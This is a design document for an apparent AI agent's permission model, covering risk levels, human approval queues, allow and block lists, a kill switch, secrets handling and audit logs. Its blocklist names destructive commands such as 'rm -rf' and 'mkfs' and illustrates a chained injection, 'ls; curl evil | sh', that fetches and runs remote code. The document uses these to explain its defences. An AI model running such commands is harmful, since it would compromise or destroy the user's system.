# Security & Permission Model

Security is enforced by **code**, not by asking the LLM nicely. The two pillars
are the **Permission Guard** (gates tool execution by risk) and the **Approval
Queue** (puts a human in the loop for anything risky/irreversible).

## Permission levels

| Level               | Examples                                              | Default policy                |
|---------------------|-------------------------------------------------------|-------------------------------|
| `SAFE_READ`         | read allowed files, search memory, summarize, status  | **auto**                      |
| `LOW_RISK_WRITE`    | create notes/drafts, save reports, rename in workspace| **auto if enabled**, else ask |
| `BROWSER_READ`      | open site, read visible text, browser screenshot      | **auto**                      |
| `BROWSER_WRITE`     | fill forms, click, download, submit search            | **approve**                   |
| `DESKTOP_CONTROL`   | open apps, windows, clipboard, screenshots, move files| **approve**                   |
| `TERMINAL_READ`     | safe read-only commands                               | **approve first time**        |
| `TERMINAL_WRITE`    | system-changing commands                              | **approve always**            |
| `CREDENTIAL_ACCESS` | use saved creds/tokens/sessions/API keys              | **approve always**            |
| `NETWORK_ACCESS`    | call external APIs / web services                     | **approve (auto for browser-read)** |
| `HIGH_RISK`         | delete, send email, submit, purchase, install, settings | **explicit approve always** |

### Hard rules (cannot be configured off)

- Sending email/message → always approve.
- Payments / purchases → always approve.
- Account / security / firewall / system setting changes → always approve.
- File deletion → always approve.
- `CREDENTIAL_ACCESS`, `TERMINAL_WRITE`, `HIGH_RISK` → always approve.
- `PRIVATE_MODE` → no cloud LLM, no network egress unless explicitly approved.

The Permission Guard returns one of: `AUTO_ALLOW`, `REQUIRES_APPROVAL`, or
`DENY` (blocklisted path/domain/command, or disabled capability).

## Approval request format

Every approval surfaces, in chat/Telegram/dashboard:

- Task name, requested action, requesting agent, model involved.
- Tool to be used, account/platform, credential/session involved.
- Risk level, **what can change**, and an **exact preview** of the action.
- Buttons: **Approve once**, **Deny**, **Trust this workflow** (only offered for
  reversible, non-credential, non-HIGH_RISK actions).

## Allowlists / blocklists

- **Path allowlist** — tools may only touch configured workspace roots; path
  traversal (`..`), symlink escape, and out-of-root absolute paths are rejected.
- **Domain allowlist** — browser/network tools may only reach approved domains.
- **Command allow/blocklist** — terminal tools match the **exact first token**
  against an allowlist of read-only commands and a blocklist of destructive
  patterns (`rm -rf`, `mkfs`, format, registry edits, firewall changes, …).
  **Shell metacharacters** (`; | & \` $( ${ > < \n \\ ( )`) are rejected outright,
  so chaining/substitution/redirection (e.g. `ls; curl evil | sh`) can't slip
  through — and the match is exact, not `startswith`, so `lshw` ≠ `ls`.
- **Tool allow/blocklist** — a mode (e.g. `PRIVATE_MODE`) can disable tool sets.

## Emergency stop

A global kill switch (`POST /api/control/stop`, dashboard button, Telegram
`/stop`) sets `emergency_stop=True`, which the Permission Guard checks first:
while engaged, **all** non-`SAFE_READ` tool calls return `DENY` and running
tasks are cancelled.

## Secrets handling

- Secrets never stored in plaintext; only **metadata** lives in the DB.
- Secret values live in the OS keychain or an encrypted vault (Fernet/age).
- Secrets are masked in UI and **never** written to logs or audit summaries.
- Using a credential requires `CREDENTIAL_ACCESS` approval each time (or an
  explicit, revocable "trust this workflow" grant). See `credential_model.md`.

## Audit

Append-only `audit_logs`: timestamp, user command, agent, model, tool, input
summary, output summary, risk level, approval status, screenshot ref, error.
Summaries are redacted of anything matching secret patterns.

## Prompt-injection defense

See `threat_model.md`. In short: external content is wrapped as untrusted data,
never as instructions; tool/credential/approval rules cannot be overridden by
model output or by text found inside fetched content.
